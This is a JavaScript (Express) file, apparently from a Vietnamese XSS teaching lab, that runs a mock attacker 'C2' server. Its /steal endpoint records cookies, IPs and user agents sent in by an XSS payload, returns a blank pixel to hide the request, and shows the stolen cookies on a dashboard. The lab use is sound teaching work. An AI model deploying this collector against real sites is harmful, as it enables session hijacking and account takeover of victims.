// hacker-server.js - "Server cua hacker" (cong 4000)
//
// Dong vai may chu ma ke tan cong dieu khien de THU THAP cookie bi danh cap
// tu payload XSS. Chi phuc vu muc dich demo/hoc tap, chay cuc bo.

const express = require('express');
const app = express();
const PORT = 4000;

// Luu cac cookie bi trom (trong bo nho)
const stolen = [];

// Endpoint ma payload XSS goi toi: /steal?c=<document.cookie>
app.get('/steal', (req, res) => {
  const cookie = req.query.c || '(rong)';
  const record = {
    time: new Date().toLocaleString('vi-VN'),
    cookie,
    ip: req.ip,
    ua: req.get('user-agent') || '',
  };
  stolen.push(record);

  console.log('\n[!] NHAN DUOC COOKIE BI TROM:');
  console.log('    Thoi gian: ' + record.time);
  console.log('    Cookie   : ' + cookie);

  // Tra ve anh 1x1 trong suot de trinh duyet nan nhan khong bao loi
  const px = Buffer.from(
    'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
    'base64'
  );
  res.set('Content-Type', 'image/gif');
  res.send(px);
});

// Trang "quan tri cua hacker": liet ke cac cookie da trom
app.get('/', (req, res) => {
  const rows = stolen.length
    ? stolen.map((s, i) => `
        <tr>
          <td>${i + 1}</td>
          <td>${escape(s.time)}</td>
          <td><code>${escape(s.cookie)}</code></td>
          <td>${escape(s.ip)}</td>
        </tr>`).join('')
    : '<tr><td colspan="4" class="empty">Chưa trộm được cookie nào. Hãy gửi payload (2) ở trang Stored XSS khi đang ở chế độ CÓ LỖ HỔNG.</td></tr>';

  res.send(`<!doctype html>
<html lang="vi"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="3">
<title>Hacker C2 · Cookie đã trộm</title>
<style>
  * { box-sizing: border-box; }
  body { font-family: 'Segoe UI', system-ui, Arial, sans-serif; background:#0a0e14; color:#e6edf3; margin:0; padding:0; line-height:1.6; }
  .top { background: linear-gradient(135deg, #7f1d1d, #b91c1c); padding: 22px 28px; box-shadow: 0 2px 16px rgba(0,0,0,.4); }
  .top h1 { margin:0; font-size:1.5rem; display:flex; align-items:center; gap:10px; }
  .top .sub { color:#fecaca; font-size:.9rem; margin-top:4px; }
  .wrap { max-width: 920px; margin: 26px auto; padding: 0 20px; }
  .bar { display:flex; gap:14px; flex-wrap:wrap; margin-bottom:18px; }
  .stat { background:#111827; border:1px solid #1f2937; border-radius:14px; padding:16px 20px; flex:1; min-width:160px; }
  .stat .n { font-size:2rem; font-weight:800; color:#f87171; }
  .stat .l { color:#9ca3af; font-size:.85rem; }
  .live { display:inline-flex; align-items:center; gap:7px; color:#86efac; font-size:.85rem; }
  .live .dot { width:9px; height:9px; border-radius:50%; background:#22c55e; box-shadow:0 0 0 4px rgba(34,197,94,.25); animation: pulse 1.5s infinite; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
  table { border-collapse: collapse; width:100%; background:#0d1117; border-radius:14px; overflow:hidden; border:1px solid #1f2937; }
  th, td { border-bottom:1px solid #1f2937; padding:12px 14px; text-align:left; font-size:.92rem; vertical-align:top; }
  th { background:#161b22; color:#9ca3af; text-transform:uppercase; font-size:.75rem; letter-spacing:.5px; }
  tr:last-child td { border-bottom:0; }
  code { color:#7ee787; word-break: break-all; font-family: ui-monospace, Consolas, monospace; }
  .empty { text-align:center; color:#6b7280; padding:28px 14px; }
  .warn { margin-top:18px; background:#1f2937; border-left:4px solid #f59e0b; border-radius:10px; padding:12px 16px; color:#fcd34d; font-size:.88rem; }
</style></head>
<body>
  <div class="top">
    <h1>☠️ Hacker C2 — Bảng điều khiển cookie đã trộm</h1>
    <div class="sub">Máy chủ giả của kẻ tấn công, chỉ dùng trong demo XSS. <span class="live"><span class="dot"></span>Tự động làm mới mỗi 3 giây</span></div>
  </div>
  <div class="wrap">
    <div class="bar">
      <div class="stat"><div class="n">${stolen.length}</div><div class="l">Cookie đã thu thập</div></div>
      <div class="stat"><div class="n">:4000</div><div class="l">Cổng đang lắng nghe</div></div>
    </div>
    <table>
      <thead><tr><th>#</th><th>Thời gian</th><th>Cookie bị đánh cắp</th><th>IP</th></tr></thead>
      <tbody>${rows}</tbody>
    </table>
    <div class="warn">⚠️ Đây là môi trường thí nghiệm cục bộ. Trong thực tế, chỉ cần một cookie phiên bị lộ là hacker có thể chiếm quyền đăng nhập của nạn nhân mà không cần mật khẩu.</div>
  </div>
</body></html>`);
});

// Escape don gian de trang hacker tu no khong bi XSS boi chinh cookie trom duoc
function escape(s) {
  return String(s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

app.listen(PORT, () => {
  console.log('==============================================');
  console.log(' Hacker C2 server dang chay tai:');
  console.log(' http://localhost:' + PORT);
  console.log(' Cho cookie bi danh cap tu payload XSS...');
  console.log('==============================================');
});
